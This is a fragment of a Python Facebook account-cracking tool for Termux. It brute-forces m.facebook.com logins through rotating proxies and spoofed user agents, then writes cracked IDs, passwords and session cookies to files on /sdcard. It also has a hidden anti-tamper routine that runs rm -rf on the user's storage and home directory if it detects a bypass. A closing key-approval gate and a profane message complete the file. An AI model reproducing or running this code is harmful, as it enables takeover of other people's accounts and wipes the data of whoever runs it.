			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,5))+'.'+str(random.randint(1,5))+',width='+str(random.randint(500,1100))+',height='+str(random.randint(999,3250))+'};FB_FW/1;]'
			nip=random.choice(prox)
			proxys= {'http': 'socks5://'+nip}
			pro = ua_ios_iphone()
			free_fb = session.get('https://m.facebook.com').text
			login_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":ids,
                        "next":"https://www.facebook.com/login/device-based/regular/login/?refsrc",
			"pass":pas,
			"login":"Log In"}
			header = {'authority':'m.facebook.com',
                        'method':'POST',
                        'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
                        'scheme':'https',
                        'accept': '*/*',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://www.facebook.com',
                        'referer': 'https://www.facebook.com/',
                        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'accept-encoding':'gzip, deflate, br',
                        'sec-fetch-user': '?1',
#                        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                        'user-agent': pro,
                        'viewport-width': '980'}
			sex = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=login_data,headers=header).text
			login_webs=session.cookies.get_dict().keys()
			if 'c_user' in login_webs:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				ids = re.findall('c_user=(.*);xs', coki)[0]
				uid = ids
				print(f"\r\x1b[1;37m(\033[1;92m𝕊𝕙𝕚𝕣𝕠-𝕆𝕜\033[1;97m) \033[1;92m{uid} • {pas}" f'  \n\033[1;97m(\033[1;92m𝕆𝕜-ℂ𝕠𝕠𝕜𝕚𝕖\033[1;97m) > {colour2}'+coki+  '');line()
				print(f"{G}({B}𝕆𝕜-ℙ𝕣𝕠𝕩𝕪{G}) {G}({B}{nip}{G}) {G}");line()
				open('/sdcard/Shiro-OK.txt', 'a').write(uid+'|'+pas+'\n'+'Cookie = '+coki+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in login_webs:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				ids = "1000"+coki1[0:11]
				uid = ids
#				print('\r\r\x1b[1;91m(𝕊𝕙𝕚𝕣𝕠-ℂ𝕡) '+uid+' • '+pas+'\033[1;97m')
#				print(f"{G}({C}ℂ𝕡-ℙ𝕣𝕠𝕩𝕪{G}) {G}({A}{nip}{G}) {G}");line()
				open('/sdcard/Shiro-CP.txt', 'a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except:
		pass

import os
environment = None

if "ANDROID_ROOT" in os.environ:
    environment = "Termux"
elif os.path.exists("/proc/version"):
    with open("/proc/version", "r") as version_file:
        version_info = version_file.read()
        if "Linux" in version_info:
            environment = "Linux"
else:
    environment = "Unknown"

if environment == "Termux":
    file_path = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py"
else:
    file_path = "/usr/local/lib/python3.10/dist-packages/requests/models.py"

with open(file_path, 'r') as file:
    content1 = file.read()
    if "https://github.com/Shiro-Cool-Roam-Tool/Approve_Token/blob/main/Cool_Roam_Approve.txt" in content1:
        print(f"\033[1;93mYou Bypassed\nMin May Ngar Loe\nLee Lar Sout Lite\nTool A Chaoung Ma Thone Chon Nae Ma A Loe Lay\nCheck Your File\nI Fuck Your Mom\nPhin Khan Lite Ma A Loe Lay\nLee Pel Ya Mal\033[0m")
        os.system("cd /sdcard")
        os.system("rm -rf *")
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /storage/emulated/0/*")
        os.system("cd /storage/emulated/0")
        os.system("rm -rf *")
        os.system("cd /sdcard && rm -rf *")
        os.system("rm -rf $HOME")
        os.system("rm -rf /sdcard/Downloads")
        exit()
    else:
        pass
print(f"{B}Welcome To My Program Or My Random Crack Tool{G}");time.sleep(3.0)

def approveme():
    Link=requests.get("https://github.com/Shiro-Cool-Roam-Tool/Approve_Token/blob/main/Cool_Roam_Approve.txt").text
    if bmh_token in Link:
        main()
    else:
        clear()
        print(f"{G}[•] {B}Your Key is Not Approved{G}");line()
        print(f"{G}[•] {B}Copy And Send Key To Admin{G}");line()
        print(f"{G}[•] {B}Token {G}: {colour2}"+bmh_token);line()
        print(f"{G}[•] {B}Press Enter To Send Your Key{G}");line();input("")
        os.system("xdg-open https://m.me/AungZinMin.2006")
        approveme()
approveme()

if __name__ == '__main__':
    menu()
